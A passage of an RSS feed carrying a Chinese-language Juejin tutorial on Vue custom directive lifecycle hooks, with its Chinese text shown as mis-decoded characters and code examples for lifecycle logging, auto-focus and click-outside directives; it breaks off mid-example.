å¸è½½ä¸æ‰å°±å…ˆè¿™æ ·å§</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue è‡ªå®šä¹‰æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸé’©å­å®Œå…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7595422019777544242</link>    <guid>https://juejin.cn/post/7595422019777544242</guid>    <pubDate>2026-01-15T10:52:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595422019777544242" data-draft-id="7595423767720673289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue è‡ªå®šä¹‰æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸé’©å­å®Œå…¨æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2026-01-15T10:52:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue è‡ªå®šä¹‰æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸé’©å­å®Œå…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:52:34.000Z" title="Thu Jan 15 2026 10:52:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue è‡ªå®šä¹‰æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸé’©å­å®Œå…¨æŒ‡å—</h2>
<blockquote>
<p>Vue è‡ªå®šä¹‰æŒ‡ä»¤æä¾›äº†å¼ºå¤§çš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œè®©ä½ å¯ä»¥ç²¾å‡†æ§åˆ¶æŒ‡ä»¤åœ¨ DOM å…ƒç´ ä¸Šçš„è¡Œä¸ºã€‚æœ¬æ–‡å°†æ·±å…¥è§£ææ‰€æœ‰é’©å­å‡½æ•°ï¼Œå¹¶æä¾›ä¸°å¯Œçš„å®ç”¨ç¤ºä¾‹ï¼</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸæ¦‚è§ˆ</h3>
<h4 data-id="heading-2">1.1 ç”Ÿå‘½å‘¨æœŸé’©å­æ€»è§ˆ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> myDirective = {
  <span class="hljs-comment">// 1. ç»‘å®šå‰ï¼ˆVue 3 æ–°å¢ï¼‰</span>
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 2. å…ƒç´ æŒ‚è½½æ—¶</span>
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 3. æ›´æ–°å‰ï¼ˆVue 2: bind â†’ Vue 3: beforeUpdateï¼‰</span>
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 4. æ›´æ–°å</span>
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 5. å¸è½½å‰ï¼ˆVue 2: unbind â†’ Vue 3: beforeUnmountï¼‰</span>
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 6. å¸è½½åï¼ˆVue 2: unbind â†’ Vue 3: unmountedï¼‰</span>
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params"/>) {},
  
  <span class="hljs-comment">// 7. Vue 2 ç‰¹æœ‰</span>
  <span class="hljs-title function_">bind</span>(<span class="hljs-params"/>) {},      <span class="hljs-comment">// Vue 3 ä¸­è¢« beforeMount + mounted æ›¿ä»£</span>
  <span class="hljs-title function_">inserted</span>(<span class="hljs-params"/>) {},  <span class="hljs-comment">// Vue 3 ä¸­è¢« mounted æ›¿ä»£</span>
  <span class="hljs-title function_">componentUpdated</span>(<span class="hljs-params"/>) {}, <span class="hljs-comment">// Vue 3 ä¸­è¢« updated æ›¿ä»£</span>
  <span class="hljs-title function_">unbind</span>(<span class="hljs-params"/>) {}     <span class="hljs-comment">// Vue 3 ä¸­è¢« beforeUnmount + unmounted æ›¿ä»£</span>
}
</code></pre>
<h4 data-id="heading-3">1.2 Vue 2 vs Vue 3 å¯¹æ¯”</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2 æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸ</span>
<span class="hljs-keyword">const</span> vue2Directive = {
  <span class="hljs-title function_">bind</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// åªè°ƒç”¨ä¸€æ¬¡ï¼ŒæŒ‡ä»¤ç¬¬ä¸€æ¬¡ç»‘å®šåˆ°å…ƒç´ æ—¶è°ƒç”¨</span>
  },
  <span class="hljs-title function_">inserted</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// è¢«ç»‘å®šå…ƒç´ æ’å…¥çˆ¶èŠ‚ç‚¹æ—¶è°ƒç”¨</span>
  },
  <span class="hljs-title function_">update</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// æ‰€åœ¨ç»„ä»¶çš„ VNode æ›´æ–°æ—¶è°ƒç”¨</span>
  },
  <span class="hljs-title function_">componentUpdated</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// æŒ‡ä»¤æ‰€åœ¨ç»„ä»¶çš„ VNode åŠå…¶å­ VNode å…¨éƒ¨æ›´æ–°åè°ƒç”¨</span>
  },
  <span class="hljs-title function_">unbind</span>(<span class="hljs-params">el, binding, vnode, oldVnode</span>) {
    <span class="hljs-comment">// åªè°ƒç”¨ä¸€æ¬¡ï¼ŒæŒ‡ä»¤ä¸å…ƒç´ è§£ç»‘æ—¶è°ƒç”¨</span>
  }
}

<span class="hljs-comment">// Vue 3 æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸï¼ˆç»„åˆå¼APIé£æ ¼ï¼‰</span>
<span class="hljs-keyword">const</span> vue3Directive = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ æŒ‚è½½å‰è°ƒç”¨</span>
  },
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ æŒ‚è½½åè°ƒç”¨</span>
  },
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ æ›´æ–°å‰è°ƒç”¨</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ æ›´æ–°åè°ƒç”¨</span>
  },
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ å¸è½½å‰è°ƒç”¨</span>
  },
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å…ƒç´ å¸è½½åè°ƒç”¨</span>
  }
}
</code></pre>
<h3 data-id="heading-4">äºŒã€æŒ‡ä»¤é’©å­å‡½æ•°è¯¦è§£</h3>
<h4 data-id="heading-5">2.1 é’©å­å‚æ•°è§£æ</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> directive = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding, vnode, prevVnode</span>) {
    <span class="hljs-comment">// å‚æ•°è¯¦è§£ï¼š</span>
    
    <span class="hljs-comment">// 1. el - æŒ‡ä»¤ç»‘å®šçš„å…ƒç´ </span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å…ƒç´ :'</span>, el)  <span class="hljs-comment">// DOM å…ƒç´ </span>
    
    <span class="hljs-comment">// 2. binding - åŒ…å«æŒ‡ä»¤ä¿¡æ¯çš„å¯¹è±¡</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'binding å¯¹è±¡:'</span>, {
      <span class="hljs-comment">// æŒ‡ä»¤çš„å€¼ï¼ˆv-my-directive="value" ä¸­çš„ valueï¼‰</span>
      <span class="hljs-attr">value</span>: binding.<span class="hljs-property">value</span>,
      
      <span class="hljs-comment">// æ—§å€¼ï¼ˆä»…åœ¨ beforeUpdate å’Œ updated ä¸­å¯ç”¨ï¼‰</span>
      <span class="hljs-attr">oldValue</span>: binding.<span class="hljs-property">oldValue</span>,
      
      <span class="hljs-comment">// å‚æ•°ï¼ˆv-my-directive:arg ä¸­çš„ argï¼‰</span>
      <span class="hljs-attr">arg</span>: binding.<span class="hljs-property">arg</span>,
      
      <span class="hljs-comment">// ä¿®é¥°ç¬¦å¯¹è±¡ï¼ˆv-my-directive.modifier ä¸­çš„ modifierï¼‰</span>
      <span class="hljs-attr">modifiers</span>: binding.<span class="hljs-property">modifiers</span>,
      
      <span class="hljs-comment">// æŒ‡ä»¤çš„å®ä¾‹</span>
      <span class="hljs-attr">instance</span>: binding.<span class="hljs-property">instance</span>,
      
      <span class="hljs-comment">// æŒ‡ä»¤çš„å®šä¹‰å¯¹è±¡</span>
      <span class="hljs-attr">dir</span>: binding.<span class="hljs-property">dir</span>
    })
    
    <span class="hljs-comment">// 3. vnode - ç»‘å®šå…ƒç´ çš„è™šæ‹ŸèŠ‚ç‚¹</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è™šæ‹ŸèŠ‚ç‚¹:'</span>, {
      <span class="hljs-attr">type</span>: vnode.<span class="hljs-property">type</span>,
      <span class="hljs-attr">props</span>: vnode.<span class="hljs-property">props</span>,
      <span class="hljs-attr">children</span>: vnode.<span class="hljs-property">children</span>,
      <span class="hljs-attr">el</span>: vnode.<span class="hljs-property">el</span>,  <span class="hljs-comment">// å¯¹åº”çš„ DOM å…ƒç´ </span>
      <span class="hljs-attr">component</span>: vnode.<span class="hljs-property">component</span>,  <span class="hljs-comment">// ç»„ä»¶å®ä¾‹</span>
      <span class="hljs-attr">dirs</span>: vnode.<span class="hljs-property">dirs</span>  <span class="hljs-comment">// æŒ‡ä»¤æ•°ç»„</span>
    })
    
    <span class="hljs-comment">// 4. prevVnode - å…ˆå‰çš„è™šæ‹ŸèŠ‚ç‚¹ï¼ˆä»…åœ¨æ›´æ–°é’©å­ä¸­å¯ç”¨ï¼‰</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å…ˆå‰è™šæ‹ŸèŠ‚ç‚¹:'</span>, prevVnode)
  }
}
</code></pre>
<h4 data-id="heading-6">2.2 é’©å­æ‰§è¡Œæ—¶æœºè¯¦è§£</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸæ¼”ç¤º --&gt;
    &lt;div 
      v-lifecycle-demo="counter" 
      v-if="showElement"
      :class="{ active: isActive }"
    &gt;
      æŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸæ¼”ç¤º
    &lt;/div&gt;
    
    &lt;button @click="increment"&gt;å¢åŠ : {{ counter }}&lt;/button&gt;
    &lt;button @click="toggleElement"&gt;åˆ‡æ¢æ˜¾ç¤º&lt;/button&gt;
    &lt;button @click="toggleClass"&gt;åˆ‡æ¢ç±»å&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
// ç”Ÿå‘½å‘¨æœŸæ¼”ç¤ºæŒ‡ä»¤
const lifecycleDemo = {
  beforeMount(el, binding) {
    console.log('1. beforeMount - ç»‘å®šå‰', {
      value: binding.value,
      elementExists: !!el.parentNode
    })
  },
  
  mounted(el, binding, vnode) {
    console.log('2. mounted - æŒ‚è½½å®Œæˆ', {
      value: binding.value,
      elementInDOM: document.body.contains(el),
      parent: el.parentNode?.tagName
    })
    
    // æ·»åŠ åˆå§‹æ ·å¼
    el.style.transition = 'all 0.3s ease'
  },
  
  beforeUpdate(el, binding) {
    console.log('3. beforeUpdate - æ›´æ–°å‰', {
      oldValue: binding.oldValue,
      newValue: binding.value,
      willUpdate: binding.value !== binding.oldValue
    })
  },
  
  updated(el, binding) {
    console.log('4. updated - æ›´æ–°å®Œæˆ', {
      oldValue: binding.oldValue,
      newValue: binding.value,
      elementText: el.textContent
    })
    
    // æ ¹æ®å€¼å˜åŒ–æ·»åŠ åŠ¨ç”»
    if (binding.value &gt; binding.oldValue) {
      el.style.transform = 'scale(1.1)'
      setTimeout(() =&gt; {
        el.style.transform = 'scale(1)'
      }, 300)
    }
  },
  
  beforeUnmount(el, binding) {
    console.log('5. beforeUnmount - å¸è½½å‰', {
      value: binding.value,
      elementInDOM: document.body.contains(el)
    })
    
    // æ·»åŠ æ·¡å‡ºåŠ¨ç”»
    el.style.opacity = '0.5'
  },
  
  unmounted(el, binding) {
    console.log('6. unmounted - å¸è½½å®Œæˆ', {
      value: binding.value,
      elementInDOM: false,  // æ­¤æ—¶å…ƒç´ å·²ä»DOMç§»é™¤
      elementReference: el  // el ä»ç„¶å¯ä»¥è®¿é—®ï¼Œä½†å·²ä¸åœ¨DOMä¸­
    })
  }
}

export default {
  directives: {
    'lifecycle-demo': lifecycleDemo
  },
  data() {
    return {
      counter: 0,
      showElement: true,
      isActive: false
    }
  },
  methods: {
    increment() {
      this.counter++
    },
    toggleElement() {
      this.showElement = !this.showElement
    },
    toggleClass() {
      this.isActive = !this.isActive
    }
  },
  mounted() {
    console.log('ç»„ä»¶ mounted - å¼€å§‹è§‚å¯ŸæŒ‡ä»¤ç”Ÿå‘½å‘¨æœŸ')
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€å®ç”¨æŒ‡ä»¤ç¤ºä¾‹</h3>
<h4 data-id="heading-8">3.1 ç„¦ç‚¹ç®¡ç†æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è‡ªåŠ¨èšç„¦æŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vFocus = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value = <span class="hljs-literal">true</span>, arg = <span class="hljs-string">'auto'</span>, modifiers } = binding
    
    <span class="hljs-keyword">if</span> (value) {
      <span class="hljs-comment">// ç«‹å³èšç„¦</span>
      <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'immediate'</span>) {
        el.<span class="hljs-title function_">focus</span>()
      }
      <span class="hljs-comment">// å»¶è¿Ÿèšç„¦</span>
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'delay'</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          el.<span class="hljs-title function_">focus</span>()
        }, binding.<span class="hljs-property">value</span>.<span class="hljs-property">delay</span> || <span class="hljs-number">100</span>)
      }
      <span class="hljs-comment">// æ¡ä»¶èšç„¦</span>
      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (arg === <span class="hljs-string">'conditional'</span>) {
        <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span>.<span class="hljs-property">condition</span>) {
          el.<span class="hljs-title function_">focus</span>()
        }
      }
      <span class="hljs-comment">// è‡ªåŠ¨èšç„¦ï¼ˆé»˜è®¤ï¼‰</span>
      <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¯¹äºè¾“å…¥æ¡†ï¼Œè‡ªåŠ¨èšç„¦</span>
        <span class="hljs-keyword">if</span> (el.<span class="hljs-property">tagName</span> === <span class="hljs-string">'INPUT'</span> || el.<span class="hljs-property">tagName</span> === <span class="hljs-string">'TEXTAREA'</span>) {
          el.<span class="hljs-title function_">focus</span>()
        }
      }
      
      <span class="hljs-comment">// å¤„ç†ä¿®é¥°ç¬¦</span>
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">select</span>) {
        el.<span class="hljs-title function_">select</span>()
      }
      
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">end</span>) {
        el.<span class="hljs-title function_">setSelectionRange</span>(el.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>, el.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>)
      }
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// å€¼å˜åŒ–æ—¶é‡æ–°èšç„¦</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span> &amp;&amp; binding.<span class="hljs-property">value</span>) {
      el.<span class="hljs-title function_">focus</span>()
      
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">select</span>) {
        el.<span class="hljs-title function_">select</span>()
      }
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// å¸è½½å‰ç§»é™¤ç„¦ç‚¹</span>
    el.<span class="hljs-title function_">blur</span>()
  }
}

<span class="hljs-comment">// ç”¨æ³•ç¤ºä¾‹</span>
<span class="hljs-comment">// &lt;input v-focus&gt;                    // è‡ªåŠ¨èšç„¦</span>
<span class="hljs-comment">// &lt;input v-focus.immediate&gt;         // ç«‹å³èšç„¦</span>
<span class="hljs-comment">// &lt;input v-focus:delay="{delay: 500}"&gt; // å»¶è¿Ÿ500msèšç„¦</span>
<span class="hljs-comment">// &lt;input v-focus:conditional="{condition: shouldFocus}"&gt; // æ¡ä»¶èšç„¦</span>
<span class="hljs-comment">// &lt;input v-focus.select&gt;            // èšç„¦å¹¶é€‰ä¸­æ–‡æœ¬</span>
<span class="hljs-comment">// &lt;input v-focus.end&gt;               // èšç„¦åˆ°æœ«å°¾</span>
</code></pre>
<h4 data-id="heading-9">3.2 ç‚¹å‡»å¤–éƒ¨æŒ‡ä»¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç‚¹å‡»å¤–éƒ¨å…³é—­æŒ‡ä»¤</span>
<span class="hljs-keyword">const</span> vClickOutside = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// åˆ›å»ºäº‹ä»¶å¤„ç†å‡½æ•°</span>
    el.<span class="hljs-property">_clickOutsideHandler</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-comment">// æ£€æŸ¥ç‚¹å‡»æ˜¯å¦åœ¨å…ƒç´ å¤–éƒ¨</span>
      <span class="hljs-keyword">if</span> (!(el === event.<span class="hljs-property">target</span> || el.<span class="hljs-title function_">contains</span>(event.<span class="hljs-property">target</span>))) {
        <span class="hljs-comment">// è°ƒç”¨ç»‘å®šå‡½æ•°</span>
        binding.<span class="hljs-title function_">value</span>(event)
      }
    }
    
    <span class="hljs-comment">// æ·»åŠ äº‹ä»¶ç›‘å¬</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    
    <span class="hljs-comment">// å¯é€‰ï¼šæ·»åŠ å…¶ä»–äº‹ä»¶ç±»å‹</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">mousedown</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousedown'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">touchstart</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'touchstart'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// æ›´æ–°æ—¶æ£€æŸ¥å€¼æ˜¯å¦å˜åŒ–</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span>) {
      <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œæ›´æ–°å¤„ç†é€»è¾‘</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç‚¹å‡»å¤–éƒ¨æŒ‡ä»¤å€¼å·²æ›´æ–°'</span>)
    }
  },
  
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// ç§»é™¤äº‹ä»¶ç›‘å¬</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">mousedown</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousedown'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">touchstart</span>) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'touchstart'</span>, el.<span class="hljs-property">_clickOutsideHandler</span>)
    }
    
    <span class="hljs-comment">// æ¸…ç†å¼•ç”¨</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_clickOutsideHandler</span>
  }
}

<span class="hljs-comment">// é«˜çº§ç‰ˆæœ¬ï¼šæ”¯æŒé…ç½®å’ŒåŠ¨æ€å¯ç”¨/ç¦ç”¨</span>
<span class="hljs-keyword">const</span> vClickOutsideAdvanced = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
    
    <span class="hljs-comment">// é»˜è®¤é…ç½®</span>
    <span class="hljs-keyword">const</span> defaultConfig = {
      <span class="hljs-attr">handler</span>: value,
      <span class="hljs-attr">events</span>: [<span class="hljs-string">'click'</span>],
      <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">capture</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">immediate</span>: <span class="hljs-literal">false</span>
    }
    
    <span class="hljs-comment">// åˆå¹¶é…ç½®</span>
    <span class="hljs-keyword">const</span> config = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'function'</span> 
      ? { ...defaultConfig, <span class="hljs-attr">handler</span>: value }
      : { ...defaultConfig, ...value }
    
    <span class="hljs-comment">// å¤„ç†ä¿®é¥°ç¬¦</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">mousedown</span>) config.<span class="hljs-property">events</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'mousedown'</span>)
